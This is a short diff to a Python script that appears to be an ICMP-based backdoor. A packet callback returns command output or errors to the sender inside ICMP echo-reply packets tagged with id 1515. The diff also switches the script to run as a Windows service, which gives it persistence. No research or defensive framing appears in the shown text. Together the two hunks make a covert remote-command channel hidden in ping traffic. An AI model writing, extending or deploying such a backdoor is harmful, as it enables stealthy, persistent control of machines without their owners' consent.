@@ -46,10 +46,10 @@ def packet_callback(packet):
         print(string_output)
         print(string_error)
         if output == '':
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + b"\n")
+            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
             send(reply_packet, verbose=False)
         else:
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + b"\n")
+            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + "\n")
             send(reply_packet, verbose=False)
 
 
@@ -205,10 +205,10 @@ class Service(win32serviceutil.ServiceFramework):
 
 
 if __name__ == '__main__':
-    main()
-    #if len(sys.argv) == 1:
-    #    servicemanager.Initialize()
-    #    servicemanager.PrepareToHostSingle(Service)
-    #    servicemanager.StartServiceCtrlDispatcher()
-    #else:
-    #    win32serviceutil.HandleCommandLine(Service)
+    # main()
+    if len(sys.argv) == 1:
+        servicemanager.Initialize()
+        servicemanager.PrepareToHostSingle(Service)
+        servicemanager.StartServiceCtrlDispatcher()
+    else:
+        win32serviceutil.HandleCommandLine(Service)
